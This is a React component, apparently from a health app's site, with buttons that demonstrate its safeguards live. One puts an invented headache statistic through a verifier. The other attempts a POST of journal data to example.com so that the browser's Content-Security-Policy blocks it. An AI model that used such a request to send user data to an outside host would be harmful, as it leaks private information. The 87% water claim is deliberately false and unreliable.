import { ShieldX, WifiOff } from 'lucide-react'
import { useState } from 'react'
import { cn } from '../../lib/cn'
import { compose } from '../../lib/guide/compose'
import { evidenceDoc } from '../../lib/guide/evidence'
import { verifyResponse } from '../../lib/guide/verify'

/**
 * Two invitations to break the two promises, run live in the reader's browser.
 *
 * Every health app claims it does not make things up and does not send your
 * data anywhere. The claims are indistinguishable from each other on a landing
 * page, which is why these are buttons rather than sentences: one puts an
 * invented sentence through the real verifier, the other tries to post data to
 * another origin from inside the real page. Both fail, visibly, with the
 * failure quoted.
 *
 * Neither is a simulation. The first calls `verifyResponse`; the second calls
 * `fetch` and lets the browser's Content-Security-Policy answer.
 */

interface Result {
  ok: boolean
  headline: string
  detail: string
}

export function BreakIt() {
  const [fabrication, setFabrication] = useState<Result | null>(null)
  const [exfiltration, setExfiltration] = useState<Result | null>(null)
  const [busy, setBusy] = useState(false)

  /** Put a plausible, fluent, entirely invented claim through the verifier. */
  function tryFabrication() {
    const doc = evidenceDoc('headache-common')
    if (!doc) return

    const honest = compose({
      intent: 'symptom',
      risk: 'low',
      selected: [{ doc, relevance: 0.6 }],
    })

    // The kind of sentence a generative model produces without blinking:
    // specific, confident, well-formed, and nowhere in the cited source.
    const invented = {
      ...honest,
      directAnswer: [
        honest.directAnswer[0],
        {
          text: 'Studies show that 87% of afternoon headaches are cured within ten minutes by drinking two litres of water.',
          kind: 'evidence' as const,
          docId: doc.id,
        },
      ],
    }

    const verdict = verifyResponse('why do I keep getting headaches', invented)

    setFabrication({
      ok: verdict.status !== 'pass',
      headline:
        verdict.status !== 'pass'
          ? 'Rejected before it could reach a screen'
          : 'It passed — which would be a bug',
      detail:
        verdict.issues[0] ??
        `evidence support ${verdict.evidenceSupport.toFixed(2)}, invented claims ${verdict.hallucinationRisk.toFixed(2)}`,
    })
  }

  /** Try to post something to another origin, from inside this page. */
  async function tryExfiltration() {
    setBusy(true)
    try {
      await fetch('https://example.com/collect', {
        method: 'POST',
        mode: 'no-cors',
        body: 'a journal entry',
      })
      setExfiltration({
        ok: false,
        headline: 'The request went out — which would be a bug',
        detail: 'The Content-Security-Policy should have refused this.',
      })
    } catch (error) {
      setExfiltration({
        ok: true,
        headline: 'Blocked by the browser, not by our good intentions',
        detail:
          error instanceof Error
            ? error.message.slice(0, 120)
            : 'Refused to connect to a host outside this origin.',
      })
    } finally {
      setBusy(false)
    }
  }

  return (
    <div className="grid gap-4 sm:grid-cols-2">
      <Panel
        icon={<ShieldX aria-hidden="true" className="h-4 w-4" />}
        title="Make it invent something"
        blurb="Slips a confident, fluent, completely made-up statistic into an answer and sends it through the real verifier."
        action="Try to fabricate"
        onClick={tryFabrication}
        result={fabrication}
      />

      <Panel
        icon={<WifiOff aria-hidden="true" className="h-4 w-4" />}
        title="Try to send data off this device"
        blurb="Attempts a POST to another origin from inside this page, exactly as a leak or an injected script would."
        action={busy ? 'Trying…' : 'Try to exfiltrate'}
        onClick={() => void tryExfiltration()}
        result={exfiltration}
        disabled={busy}
      />
    </div>
  )
}

function Panel({
  icon,
  title,
  blurb,
  action,
  onClick,
  result,
  disabled,
}: {
  icon: React.ReactNode
  title: string
  blurb: string
  action: string
  onClick: () => void
  result: Result | null
  disabled?: boolean
}) {
  return (
    <div className="flex flex-col rounded-3xl border border-border bg-surface/85 p-5 shadow-soft backdrop-blur sm:p-6">
      <h3 className="flex items-center gap-2 font-sans text-lg font-medium text-text">
        <span className="text-primary">{icon}</span>
        {title}
      </h3>
      <p className="mt-2 flex-1 text-sm text-text-muted">{blurb}</p>

      <button
        type="button"
        onClick={onClick}
        disabled={disabled}
        className={cn(
          'mt-4 min-h-11 self-start rounded-pill border border-border bg-surface px-5',
          'text-sm font-medium text-text shadow-soft',
          'transition-colors duration-250 ease-calm',
          'hover:border-border-strong hover:bg-surface-muted',
          'focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2',
          'focus-visible:outline-ring disabled:opacity-55',
        )}
      >
        {action}
      </button>

      <div aria-live="polite" className="mt-3 min-h-[3.25rem]">
        {result ? (
          <div
            className={cn(
              'rounded-2xl p-3.5 text-sm',
              result.ok ? 'bg-success-soft text-text' : 'bg-accent-soft text-text',
            )}
          >
            <p className="font-medium">{result.headline}</p>
            <p className="mt-1 break-words text-text-muted">{result.detail}</p>
          </div>
        ) : null}
      </div>
    </div>
  )
}

export default BreakIt
